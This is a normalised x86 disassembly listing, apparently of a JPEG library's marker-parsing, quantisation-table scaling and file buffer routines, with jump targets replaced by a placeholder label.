mov [ ebx + 0x128 ] al
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_496a64
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov [ esp ] eax
mov eax [ esp ]
mov edi [ eax + 0x18 ]
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
xor eax eax
dec esi
mov al [ ebx ]
inc ebx
shl eax 0x8
test esi esi
mov [ esp + 0x4 ] eax
jne r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
dec esi
xor eax eax
mov al [ ebx ]
add [ esp + 0x4 ] eax
inc ebx
sub [ esp + 0x4 ] 0x2
cmp [ esp + 0x4 ] 0xe
jl r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov [ esp + 0xc ] 0xe
jmp r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov [ esp + 0xc ] ecx
mov edx [ esp + 0x4 ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
lea ebp [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0xc ]
jae r-xdata
mov ecx [ esp + 0x4 ]
sub ecx [ esp + 0xc ]
mov [ esp + 0x4 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x1a0 ]
sub edx 0xe0
je r-xdata
test esi esi
jne r-xdata
mov ecx [ esp + 0x4 ]
push ecx
lea edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
call sub_496720
jmp r-xdata
sub edx 0xe
je r-xdata
dec esi
mov al [ ebx ]
mov [ ebp ] al
inc ebx
inc [ esp + 0x8 ]
inc ebp
mov edx [ esp + 0x8 ]
cmp edx [ esp + 0xc ]
jb r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ esp + 0x4 ]
push eax
lea edx [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
call sub_496984
jmp r-xdata
jmp r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov eax 0x1
mov edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
call [ ecx + 0x10 ]
mov edx [ esp ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x44
mov edx [ esp ]
mov ecx [ edx + 0x1a0 ]
mov [ eax + 0x18 ] ecx
mov eax [ esp ]
mov edx [ eax ]
call [ edx ]
sub_496bd0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe4
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1b8 ]
mov [ esp + 0x4 ] edx
xor edx edx
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0xa4 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x18 ]
mov [ esp + 0x14 ] eax
cmp [ esp + 0x8 ] 0x0
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x14 ]
mov esi [ edx ]
mov ebx [ eax + 0x4 ]
jne r-xdata
mov eax [ esp + 0x4 ]
mov edi [ eax + 0xa8 ]
mov eax [ esp + 0x8 ]
mov edx [ eax + 0xc ]
mov [ esp + 0xc ] edx
mov ecx [ esp + 0x8 ]
mov ebp [ ecx + 0x10 ]
add ebp edi
test ebx ebx
jne r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov eax [ esp + 0x14 ]
test ebx ebx
mov [ eax ] esi
mov edx [ esp + 0x14 ]
mov [ edx + 0x4 ] ebx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0xa8 ] edi
jne r-xdata
xor eax eax
dec ebx
mov al [ esi ]
inc esi
shl eax 0x8
test ebx ebx
mov [ esp + 0x10 ] eax
jne r-xdata
mov ebx [ esp + 0x14 ]
mov eax [ esp ]
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ ecx + 0xa4 ] eax
mov edx [ esp ]
mov ecx [ edx + 0x1a0 ]
sub ecx 0xe0
je r-xdata
mov edx [ esp ]
cmp [ edx + 0x130 ] 0x0
jne r-xdata
cmp edi [ esp + 0xc ]
jae r-xdata
mov ebx [ esp + 0x14 ]
mov eax [ esp ]
call [ ebx + 0xc ]
test eax eax
jne r-xdata
dec ebx
xor eax eax
mov al [ esi ]
add [ esp + 0x10 ] eax
inc esi
sub [ esp + 0x10 ] 0x2
cmp [ esp + 0x10 ] 0x0
jl r-xdata
mov ebx [ esp + 0x14 ]
mov eax [ esp ]
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
mov ebx [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0x10 ]
mov edx ebp
mov eax [ esp + 0x4 ]
call sub_496720
jmp r-xdata
sub ecx 0xe
je r-xdata
mov edx [ esp ]
mov eax [ edx + 0x130 ]
jmp r-xdata
mov ecx [ esp ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0x130 ] eax
jmp r-xdata
cmp edi [ esp + 0xc ]
jb r-xdata
test ebx ebx
ja r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
mov ebx [ eax + 0x4 ]
mov esi [ edx ]
jmp r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov edi edx
xor ebp ebp
jmp r-xdata
mov edx [ esp ]
mov eax [ edx + 0x1a0 ]
cmp eax 0xfe
jne r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
mov ebx [ eax + 0x4 ]
mov esi [ edx ]
xor eax eax
jmp r-xdata
add esp 0x1c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
mov [ eax ] esi
mov edx [ esp + 0x14 ]
mov [ edx + 0x4 ] ebx
cmp [ esp + 0x10 ] 0x0
jle r-xdata
mov edx [ esp + 0x10 ]
push edx
mov ecx [ esp + 0x10 ]
mov edx ebp
mov eax [ esp + 0x4 ]
call sub_496984
jmp r-xdata
jmp r-xdata
mov edx [ eax ]
test edx edx
jne r-xdata
mov eax [ esp + 0x8 ]
mov ebp [ eax + 0x10 ]
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x8 ]
sub edx [ esp + 0xc ]
mov [ esp + 0x10 ] edx
mov al [ esi ]
inc esi
mov [ ebp ] al
inc ebp
dec ebx
inc edi
cmp edi [ esp + 0xc ]
jae r-xdata
mov edx [ esp + 0x4 ]
mov eax [ edx + eax * 4 - 0x31c ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x60 ]
mov [ esp + 0x18 ] ecx
jmp r-xdata
mov eax 0x1
mov edx [ esp + 0x10 ]
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
call [ ecx + 0x10 ]
mov ecx [ esp ]
mov eax [ ecx ]
mov [ eax + 0x14 ] 0x5b
mov edx [ esp ]
mov ecx [ edx + 0x1a0 ]
mov [ eax + 0x18 ] ecx
mov edx [ esp + 0xc ]
add edx [ esp + 0x10 ]
mov [ eax + 0x1c ] edx
mov edx 0x1
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax edx
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ esp ]
mov ecx [ esp + 0x18 ]
add ecx 0x14
mov edx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x4 ]
mov [ esp + 0x8 ] eax
xor edx edx
mov eax [ esp + 0x8 ]
mov [ eax ] edx
mov ecx [ esp ]
mov edx [ esp + 0x8 ]
mov al [ ecx + 0x1a0 ]
mov [ edx + 0x4 ] al
mov ecx [ esp + 0x8 ]
mov [ ecx + 0x8 ] edi
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x18 ]
mov [ eax + 0xc ] edx
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x8 ]
add ecx 0x14
mov [ eax + 0x10 ] ecx
mov ebp ecx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax + 0xa4 ] edx
xor eax eax
mov ecx [ esp + 0x4 ]
xor edi edi
mov [ ecx + 0xa8 ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x18 ] edi
mov edi [ esp + 0x10 ]
cmp edi [ esp + 0x18 ]
jae r-xdata
sub_496ecc
push ebx
push esi
push edi
mov esi eax
push ebp
push ecx
mov ebx [ esi + 0x18 ]
mov ebp [ ebx + 0x4 ]
mov edi [ ebx ]
test ebp ebp
jne r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
shl eax 0x8
test ebp ebp
mov [ esp ] eax
jne r-xdata
mov eax esi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
xor eax eax
dec ebp
mov al [ edi ]
inc edi
add [ esp ] eax
sub [ esp ] 0x2
mov eax [ esi ]
mov [ eax + 0x14 ] 0x5b
mov edx [ esi + 0x1a0 ]
mov [ eax + 0x18 ] edx
mov edx 0x1
mov ecx [ esp ]
mov [ eax + 0x1c ] ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebx ] edi
mov [ ebx + 0x4 ] ebp
cmp [ esp ] 0x0
jle r-xdata
mov eax esi
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov edi [ ebx ]
mov ebp [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
mov eax 0x1
mov edx [ esp ]
mov eax esi
mov ecx [ eax + 0x18 ]
call [ ecx + 0x10 ]
mov edi [ ebx ]
mov ebp [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_496f68
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] eax
mov eax [ esp ]
mov edi [ eax + 0x18 ]
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
movzx ebp [ ebx ]
inc ebx
dec esi
cmp ebp 0xff
je r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
test esi esi
jne r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1b8 ]
inc [ edx + 0x18 ]
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
test esi esi
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
movzx ebp [ ebx ]
inc ebx
dec esi
cmp ebp 0xff
je r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
movzx ebp [ ebx ]
inc ebx
dec esi
cmp ebp 0xff
jne r-xdata
mov eax [ esp ]
call [ edi + 0xc ]
test eax eax
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebp ebp
jne r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov ebx [ edi ]
mov esi [ edi + 0x4 ]
xor eax eax
jmp r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x1b8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1b8 ]
add [ edx + 0x18 ] 0x2
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
jmp r-xdata
mov eax [ esp ]
mov [ eax + 0x1a0 ] ebp
mov [ edi ] ebx
mov [ edi + 0x4 ] esi
mov eax 0x1
mov edx [ esp ]
mov eax [ edx ]
mov [ eax + 0x14 ] 0x74
mov edx [ esp ]
mov ecx [ edx + 0x1b8 ]
mov edx [ ecx + 0x18 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] ebp
or edx 0xffffffff
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ esp ]
mov edx [ eax + 0x1b8 ]
xor ecx ecx
mov [ edx + 0x18 ] ecx
test esi esi
jne r-xdata
sub_49707c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp eax
mov ebx [ ebp + 0x18 ]
mov esi [ ebx ]
mov edi [ ebx + 0x4 ]
test edi edi
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
mov [ esp ] eax
inc esi
test edi edi
jne r-xdata
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
dec edi
xor eax eax
mov al [ esi ]
mov [ esp + 0x4 ] eax
inc esi
cmp [ esp ] 0xff
jne r-xdata
mov eax ebp
call [ ebx + 0xc ]
test eax eax
jne r-xdata
mov esi [ ebx ]
mov edi [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
mov eax [ ebp ]
mov [ eax + 0x14 ] 0x35
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x1c ] ecx
mov eax ebp
mov edx [ eax ]
call [ edx ]
cmp [ esp + 0x4 ] 0xd8
je r-xdata
mov esi [ ebx ]
mov edi [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x4 ]
mov eax 0x1
mov [ ebp + 0x1a0 ] ecx
mov [ ebx ] esi
mov [ ebx + 0x4 ] edi
sub_497118
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x1a0 ]
cmp edx 0xcd
jge r-xdata
mov eax [ ebx + 0x1b8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp edx 0xdb
jg r-xdata
cmp edx 0xc5
jge r-xdata
mov eax ebx
call sub_496f68
test eax eax
jne r-xdata
mov eax ebx
call sub_49707c
test eax eax
jne r-xdata
sub edx 0xdc
je r-xdata
je r-xdata
add edx 0xffffff3b
cmp edx 0x7
ja r-xdata
cmp edx 0xc2
jg r-xdata
xor eax eax
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
call sub_496ecc
test eax eax
jne r-xdata
dec edx
je r-xdata
mov eax ebx
call sub_496398
test eax eax
jne r-xdata
add edx 0xffffff33
cmp edx 0xd
ja r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x44
mov edx [ ebx + 0x1a0 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp [ edx * 4 + jump_table_4971be ]
sub edx 0xc3
je r-xdata
je r-xdata
xor ecx ecx
mov [ ebx + 0x1a0 ] ecx
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
call sub_496634
test eax eax
jne r-xdata
add edx 0xfffffffd
sub edx 0x10
jb r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp [ edx * 4 + jump_table_497202 ]
cmp [ ebx + 0x1a0 ] 0x0
jne r-xdata
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_4959a4
test eax eax
jne r-xdata
mov ecx 0x1
mov edx 0x1
mov eax ebx
call sub_4959a4
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x3c
mov edx [ ebx + 0x1a0 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
call sub_496ecc
test eax eax
jne r-xdata
dec edx
je r-xdata
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_4959a4
test eax eax
jne r-xdata
dec edx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx [ ebx + 0x1b8 ]
mov ecx [ ebx + 0x1a0 ]
mov esi [ edx + ecx * 4 - 0x360 ]
mov eax ebx
call esi
test eax eax
jne r-xdata
sub edx 0xe
je r-xdata
mov eax ebx
call sub_4958f0
test eax eax
jne r-xdata
mov eax ebx
call sub_495d24
test eax eax
jne r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x55
mov ecx [ eax ]
mov edx 0x1
call [ ecx + 0x4 ]
xor eax eax
mov [ ebx + 0x1a0 ] eax
mov eax 0x2
pop esi
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x5c
mov edx [ ebx + 0x1a0 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x4 ]
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
call sub_496064
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
add edx 0xffffff41
sub edx 0x2
jb r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax + 0x1b8 ]
call [ edx + 0x1c ]
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax 0x1
xor edx edx
mov [ ebx + 0x1a0 ] edx
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4959a4
test eax eax
jne r-xdata
jmp r-xdata
xor eax eax
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_497428
push ebx
mov ebx eax
cmp [ ebx + 0x1a0 ] 0x0
jne r-xdata
mov edx [ ebx + 0x1b8 ]
mov ecx [ edx + 0x14 ]
add ecx 0xd0
cmp ecx [ ebx + 0x1a0 ]
jne r-xdata
mov eax ebx
call sub_496f68
test eax eax
jne r-xdata
mov eax ebx
mov edx [ ebx + 0x1b8 ]
mov ecx [ eax + 0x18 ]
mov edx [ edx + 0x14 ]
call [ ecx + 0x14 ]
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x62
mov edx [ ebx + 0x1b8 ]
mov ecx [ edx + 0x14 ]
mov edx 0x3
mov [ eax + 0x18 ] ecx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
mov [ ebx + 0x1a0 ] eax
jmp r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x1b8 ]
mov edx [ eax + 0x14 ]
inc edx
and edx 0x7
mov [ eax + 0x14 ] edx
mov eax 0x1
pop ebx
retn
xor eax eax
pop ebx
retn
sub_4974b8
push ebx
push esi
mov esi eax
push edi
push ebp
mov ebp edx
mov eax [ esi ]
mov ebx [ esi + 0x1a0 ]
or edx 0xffffffff
mov [ eax + 0x14 ] 0x79
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] ebp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
cmp ebx 0xd0
jl r-xdata
mov edi 0x2
jmp r-xdata
mov edi 0x3
jmp r-xdata
cmp ebx 0xd7
jle r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x61
mov [ eax + 0x18 ] ebx
mov [ eax + 0x1c ] edi
mov edx 0x4
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
dec edi
je r-xdata
lea eax [ ebp + 0x1 ]
and eax 0x7
add eax 0xd0
cmp ebx eax
je r-xdata
xor edx edx
mov eax 0x1
mov [ esi + 0x1a0 ] edx
jmp r-xdata
dec edi
je r-xdata
mov edi 0x3
jmp r-xdata
lea edx [ ebp + 0x2 ]
and edx 0x7
add edx 0xd0
cmp ebx edx
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_496f68
test eax eax
jne r-xdata
dec edi
je r-xdata
lea eax [ ebp - 0x1 ]
and eax 0x7
add eax 0xd0
cmp ebx eax
je r-xdata
mov ebx [ esi + 0x1a0 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov edi 0x2
jmp r-xdata
lea edx [ ebp - 0x2 ]
and edx 0x7
add edx 0xd0
cmp ebx edx
jne r-xdata
cmp ebx 0xc0
jge r-xdata
mov edi 0x1
sub_4975b4
mov edx [ eax + 0x1b8 ]
xor ecx ecx
mov [ eax + 0xd8 ] ecx
xor ecx ecx
mov [ eax + 0x90 ] ecx
xor ecx ecx
mov [ eax + 0x1a0 ] ecx
xor eax eax
mov [ edx + 0xc ] eax
xor eax eax
mov [ edx + 0x10 ] eax
xor ecx ecx
mov [ edx + 0x18 ] ecx
xor eax eax
mov [ edx + 0xa4 ] eax
retn
sub_4975ec
push ebx
push ecx
mov [ esp ] eax
mov ecx 0xac
xor edx edx
mov eax [ esp ]
mov ebx [ eax + 0x4 ]
call [ ebx ]
mov edx eax
mov eax [ esp ]
xor ecx ecx
mov [ eax + 0x1b8 ] edx
mov [ edx ] sub_4975b4
lea eax [ edx + 0x20 ]
mov [ edx + 0x4 ] sub_497118
mov [ edx + 0x8 ] sub_497428
mov [ edx + 0x1c ] sub_496ecc
mov [ edx + 0x60 ] ecx
xor ecx ecx
mov [ eax ] sub_496ecc
xor ebx ebx
mov [ eax + 0x44 ] ebx
inc ecx
add eax 0x4
cmp ecx 0x10
jl r-xdata
mov [ edx + 0x20 ] sub_496a64
mov [ edx + 0x58 ] sub_496a64
mov eax [ esp ]
call sub_4975b4
pop edx
pop ebx
retn
sub_497660
push ebx
push esi
mov ebx [ eax + 0x1b8 ]
mov esi [ eax + 0x4 ]
mov esi [ esi + 0x30 ]
sub esi 0x14
cmp esi ecx
jge r-xdata
test ecx ecx
je r-xdata
mov ecx esi
mov esi sub_496ecc
cmp edx 0xe0
je r-xdata
mov esi sub_496bd0
cmp edx 0xe0
jne r-xdata
mov esi sub_496a64
cmp edx 0xee
jne r-xdata
cmp edx 0xee
jne r-xdata
cmp ecx 0xe
jae r-xdata
cmp edx 0xe0
jl r-xdata
mov [ ebx + 0x1c ] esi
mov [ ebx + 0x60 ] ecx
pop esi
pop ebx
retn
cmp edx 0xfe
jne r-xdata
cmp ecx 0xc
jae r-xdata
mov ecx 0xe
jmp r-xdata
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x44
mov [ ecx + 0x18 ] edx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
cmp edx 0xef
jg r-xdata
mov ecx 0xc
jmp r-xdata
mov [ ebx + edx * 4 - 0x360 ] esi
mov [ ebx + edx * 4 - 0x31c ] ecx
pop esi
pop ebx
retn
sub_497708
push ebx
cmp edx 0xfe
mov ebx [ eax + 0x1b8 ]
jne r-xdata
cmp edx 0xe0
jl r-xdata
mov [ ebx + 0x1c ] ecx
pop ebx
retn
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x44
mov [ ecx + 0x18 ] edx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
cmp edx 0xef
jg r-xdata
mov [ ebx + edx * 4 - 0x360 ] ecx
pop ebx
retn
sub_497770
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
shl edx 0x2
mov [ ebp - 0x4 ] eax
add ebx edx
mov edx [ ebp + 0x10 ]
shl edx 0x2
mov esi ecx
add esi edx
mov edi [ ebp + 0xc ]
test edi edi
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebx ]
add ebx 0x4
mov edx [ esi ]
add esi 0x4
mov ecx [ ebp - 0x4 ]
push ecx
push eax
push edx
call sub_48ab50
add esp 0xc
dec edi
test edi edi
jg r-xdata
sub_4977dc
push ebx
push esi
mov esi eax
cmp [ esi + 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ebx 0x1
mov edx ebx
mov eax esi
mov ecx [ eax + 0x4 ]
call [ ecx + 0x24 ]
dec ebx
test ebx ebx
jg r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov [ esi + 0x14 ] 0x64
mov [ esi + 0x14 ] 0xc8
xor eax eax
mov [ esi + 0x130 ] eax
pop esi
pop ebx
retn
sub_49781c
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
xor ecx ecx
xor eax eax
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x14 ] eax
pop ebx
retn
mov eax ebx
mov edx [ eax + 0x4 ]
call [ edx + 0x28 ]
sub_49786c
push ebx
push esi
mov esi eax
push edi
mov eax esi
mov ecx 0x1000
mov ebx [ esi + 0x18 ]
mov edx 0x1
mov esi [ eax + 0x4 ]
call [ esi ]
mov edi eax
mov [ ebx + 0x18 ] edi
mov [ ebx ] edi
mov [ ebx + 0x4 ] 0x1000
pop edi
pop esi
pop ebx
retn
sub_497898
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x18 ]
mov eax [ ebx + 0x14 ]
push eax
push 0x1000
push 0x1
mov edx [ ebx + 0x18 ]
push edx
call sub_48ab80
add esp 0x10
cmp eax 0x1000
je r-xdata
mov ecx [ ebx + 0x18 ]
mov eax 0x1
mov [ ebx ] ecx
mov [ ebx + 0x4 ] 0x1000
pop esi
pop ebx
retn
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x25
mov edx [ eax ]
call [ edx ]
sub_4978e0
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x18 ]
mov esi 0x1000
sub esi [ ebx + 0x4 ]
test esi esi
jbe r-xdata
mov ecx [ ebx + 0x14 ]
push ecx
call sub_48ab9c
pop ecx
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
push eax
push esi
push 0x1
mov edx [ ebx + 0x18 ]
push edx
call sub_48ab80
add esp 0x10
cmp esi eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov [ eax + 0x14 ] 0x25
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx [ edi ]
mov eax edi
mov [ ecx + 0x14 ] 0x25
mov edx [ eax ]
call [ edx ]
sub_49793c
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0x18 ] 0x0
mov esi edx
jne r-xdata
mov eax [ ebx + 0x18 ]
mov [ eax + 0x8 ] sub_49786c
mov [ eax + 0xc ] sub_497898
mov [ eax + 0x10 ] sub_4978e0
mov [ eax + 0x14 ] esi
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x1c
xor edx edx
mov edi [ eax + 0x4 ]
call [ edi ]
mov [ ebx + 0x18 ] eax
sub_49797c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push esi
push edi
mov [ ebp - 0x4 ] ecx
cmp [ ebx + 0x14 ] 0x64
mov esi edx
je r-xdata
test esi esi
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1f
mov [ eax + 0x18 ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp esi 0x4
jl r-xdata
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov ebx edx
mov eax ebx
call sub_49783c
mov [ esi ] eax
lea ecx [ ebx + esi * 4 + 0x44 ]
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
cmp eax 0x7fff
jle r-xdata
mov eax 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0x7fff
mov edx [ esi ]
add ebx 0x4
mov [ edx + ecx * 2 ] ax
inc ecx
cmp ecx 0x40
jl r-xdata
cmp eax 0xff
jle r-xdata
mov eax [ ebx ]
imul [ ebp + 0xc ]
add eax 0x32
mov edi 0x64
cdq
idiv edi
test eax eax
jg r-xdata
mov ecx [ esi ]
xor eax eax
mov [ ecx + 0x80 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax 0xff
sub_497a34
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx rw-data
xor edx edx
mov eax ebx
call sub_49797c
push esi
push edi
mov ecx rw-data
mov edx 0x1
mov eax ebx
call sub_49797c
pop edi
pop esi
pop ebx
retn
sub_497a64
mov ecx eax
test ecx ecx
jg r-xdata
cmp ecx 0x64
jle r-xdata
mov ecx 0x1
cmp ecx 0x32
jge r-xdata
mov ecx 0x64
add ecx ecx
mov eax 0xc8
sub eax ecx
mov ecx eax
mov eax 0x1388
cdq
idiv ecx
mov ecx eax
jmp r-xdata
mov eax ecx
retn
sub_497a98
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax edx
call sub_497a64
mov edx eax
mov ecx esi
mov eax ebx
call sub_497a34
pop esi
pop ebx
retn
sub_497ab4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
cmp [ esi ] 0x0
jne r-xdata
push 0x11
push edi
mov edx [ esi ]
push edx
call sub_48ab50
add esp 0xc
xor ebx ebx
mov edx 0x1
lea eax [ edi + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_497854
mov [ esi ] eax
xor ecx ecx
inc edx
mov cl [ eax ]
inc eax
add ebx ecx
cmp edx 0x10
jle r-xdata
cmp ebx 0x1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
cmp ebx 0x100
jle r-xdata
push ebx
mov ecx [ ebp + 0x8 ]
push ecx
mov eax [ esi ]
add eax 0x11
push eax
call sub_48ab50
add esp 0xc
mov edx [ esi ]
